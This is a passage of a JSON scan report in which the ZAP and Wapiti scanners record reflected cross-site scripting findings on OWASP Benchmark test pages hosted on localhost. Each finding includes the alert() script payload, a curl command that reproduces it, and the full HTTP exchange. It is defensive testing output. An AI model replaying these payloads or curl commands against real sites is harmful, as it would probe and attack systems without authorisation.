                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-03/BenchmarkTest01589",
                    "Wapiti - https://localhost:8444/benchmark/xss-03/BenchmarkTest01589?BenchmarkTest01589=SafeText&BenchmarkTest01589=Movies&BenchmarkTest01589=Writing&BenchmarkTest01589=%3CScRiPt%3Ealert%28%27woze7dxvcj%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('woze7dxvcj')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('woze7dxvcj')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01589\" -e \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01589.html\" -d \"BenchmarkTest01589=SafeText&BenchmarkTest01589=Movies&BenchmarkTest01589=Writing&BenchmarkTest01589=%3CScRiPt%3Ealert%28%27woze7dxvcj%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01589"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01589', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01589.html?BenchmarkTest01589=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAxNTg5PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01589', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01589.html', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest01589=SafeText&BenchmarkTest01589=Movies&BenchmarkTest01589=Writing&BenchmarkTest01589=%3CScRiPt%3Ealert%28%27woze7dxvcj%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '49', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:58 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: <scrIpt>alert(1);</scRipt> and b.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '59', 'date': 'Sun, 31 Aug 2025 04:25:31 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: <ScRiPt>alert('woze7dxvcj')</sCrIpT> and b.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-03/BenchmarkTest01590",
                    "Wapiti - https://localhost:8444/benchmark/xss-03/BenchmarkTest01590?BenchmarkTest01590=%3CScRiPt%3Ealert%28%27w9r2cjtqaq%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w9r2cjtqaq')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w9r2cjtqaq')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01590\" -e \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01590.html?BenchmarkTest01590=SafeText\" -d \"BenchmarkTest01590=%3CScRiPt%3Ealert%28%27w9r2cjtqaq%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01590"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01590', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '61', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01590.html?BenchmarkTest01590=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAxNTkwPSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01590', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01590.html?BenchmarkTest01590=SafeText', 'content-length': '73', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest01590=%3CScRiPt%3Ealert%28%27w9r2cjtqaq%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:58 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:25:31 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w9r2cjtqaq')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-03/BenchmarkTest01592",
                    "Wapiti - https://localhost:8444/benchmark/xss-03/BenchmarkTest01592?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01592=%3CScRiPt%3Ealert%28%27wtkfkigv1i%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wtkfkigv1i')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wtkfkigv1i')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01592\" -e \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01592.html\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01592=%3CScRiPt%3Ealert%28%27wtkfkigv1i%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01592"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01592', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01592.html?BenchmarkTest01592=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDE1OTI9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01592', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01592.html', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01592=%3CScRiPt%3Ealert%28%27wtkfkigv1i%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '27', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:59 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '37', 'date': 'Sun, 31 Aug 2025 04:25:31 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wtkfkigv1i')</sCrIpT>\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-03/BenchmarkTest01594",
                    "Wapiti - https://localhost:8444/benchmark/xss-03/BenchmarkTest01594?BenchmarkTest01594=SafeText&BenchmarkTest01594=Movies&BenchmarkTest01594=Writing&BenchmarkTest01594=%3CScRiPt%3Ealert%28%27ws5rvhj1fp%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('ws5rvhj1fp')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('ws5rvhj1fp')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01594\" -e \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01594.html\" -d \"BenchmarkTest01594=SafeText&BenchmarkTest01594=Movies&BenchmarkTest01594=Writing&BenchmarkTest01594=%3CScRiPt%3Ealert%28%27ws5rvhj1fp%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01594"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01594', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01594.html?BenchmarkTest01594=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAxNTk0PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01594', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01594.html', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest01594=SafeText&BenchmarkTest01594=Movies&BenchmarkTest01594=Writing&BenchmarkTest01594=%3CScRiPt%3Ealert%28%27ws5rvhj1fp%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '37', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:58 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>_SafeStuff\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '47', 'date': 'Sun, 31 Aug 2025 04:25:38 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('ws5rvhj1fp')</sCrIpT>_SafeStuff\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-03/BenchmarkTest01597",
                    "Wapiti - https://localhost:8444/benchmark/xss-03/BenchmarkTest01597?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01597=%3CScRiPt%3Ealert%28%27wp6gcxfxj5%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wp6gcxfxj5')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wp6gcxfxj5')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01597\" -e \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01597.html?BenchmarkTest01597=SafeText\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01597=%3CScRiPt%3Ealert%28%27wp6gcxfxj5%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01597"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
